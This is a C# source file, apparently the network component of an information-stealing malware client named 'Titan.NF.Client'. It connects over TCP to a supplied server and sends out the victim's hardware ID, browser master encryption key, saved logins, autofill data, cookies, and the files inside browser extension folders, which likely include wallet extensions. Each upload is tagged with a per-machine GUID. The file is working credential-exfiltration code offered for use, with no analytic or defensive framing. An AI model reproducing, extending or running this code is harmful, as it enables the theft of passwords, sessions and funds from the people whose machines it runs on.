using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using Titan.NF.Client.Browsers.Contracts;
using Titan.NF.Client.Hardware;
using WatsonTcp;

namespace Titan.NF.Client.Network
{
    internal class NetworkService
    {
        public static WatsonTcpClient _client = null;

        public static bool Connect(string ip, int port)
        {
            if (_client == null)
            {
                _client = new WatsonTcpClient(ip, port);
                _client.Events.MessageReceived += OnResponse;
                _client.Connect();
            }

            return _client.Connected;
        }

        public static async void SendHardwareEntry(string entry)
        {
            if (_client != null)
            {
                await _client.SendAsync(entry, new Dictionary<string, object>()
                {
                    ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                    ["bridge"] = "profile",
                    ["guid"] = HardwareService.GetHardwareId(),
                });
            }
        }

        public static async void SendHardwareProfile(List<string> data)
        {
            if (_client != null)
            {
                await _client.SendAsync("profile-bridge", new Dictionary<string, object>()
                {
                    ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                    ["bridge"] = "profile",
                    ["value"] = data,
                    ["guid"] = HardwareService.GetHardwareId(),
                });
            }
        }

        public static async void SendBrowserData(IBrowserGrabber grabber)
        {
            if (_client != null)
            {
                var guid = HardwareService.GetHardwareId();

                // Send the master key
                var key = grabber.MasterKey();
                if(key.Length > 0)
                {
                    await _client.SendAsync(Convert.ToBase64String(grabber.MasterKey()), new Dictionary<string, object>()
                    {
                        ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                        ["bridge"] = "binary",
                        ["type"] = "Browser",
                        ["subtype"] = "MasterKey",
                        ["tag"] = grabber.Tag(),
                        ["guid"] = guid,
                    });
                }

                // Send the login data
                var loginData = grabber.LoginDatas();
                if(loginData.Length > 0)
                {
                    await _client.SendAsync(grabber.LoginDatas(), new Dictionary<string, object>()
                    {
                        ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                        ["bridge"] = "binary",
                        ["type"] = "Browser",
                        ["subtype"] = "LoginData",
                        ["tag"] = grabber.Tag(),
                        ["guid"] = guid,
                    });
                }

                // Send the web data
                var webData = grabber.WebData();
                if(webData.Length > 0)
                {
                    await _client.SendAsync(grabber.WebData(), new Dictionary<string, object>()
                    {
                        ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                        ["bridge"] = "binary",
                        ["type"] = "Browser",
                        ["subtype"] = "WebData",
                        ["tag"] = grabber.Tag(),
                        ["guid"] = guid,
                    });
                }

                // Send the cookies
                var cookies = grabber.Cookie();
                if(cookies.Length > 0)
                {
                    await _client.SendAsync(grabber.Cookie(), new Dictionary<string, object>()
                    {
                        ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                        ["bridge"] = "binary",
                        ["type"] = "Browser",
                        ["subtype"] = "Cookies",
                        ["tag"] = grabber.Tag(),
                        ["guid"] = guid,
                    });
                }

                foreach (var extension in grabber.Extensions())
                {
                    foreach (var file in Directory.GetFiles(extension.Value, "*.*", SearchOption.AllDirectories))
                    {
                        if(file.Contains(".svg") || file.Contains(".js") || file.Contains(".png"))
                        {
                            continue;
                        }

                        await _client.SendAsync(File.ReadAllBytes(file), new Dictionary<string, object>()
                        {
                            ["language"] = Thread.CurrentThread.CurrentCulture.Name,
                            ["bridge"] = "binary",
                            ["type"] = "Extensions",
                            ["subtype"] = extension.Key + "__" + Path.GetFileName(file),
                            ["tag"] = grabber.Tag(),
                            ["guid"] = guid,
                        });
                    }
                }
            }
        }


        private static void OnResponse(object sender, MessageReceivedEventArgs e)
        {
            //Console.WriteLine($"Recevied: {Encoding.UTF8.GetString(e.Data)} / md: {string.Join(Environment.NewLine, e.Metadata)}");
        }
    }
}
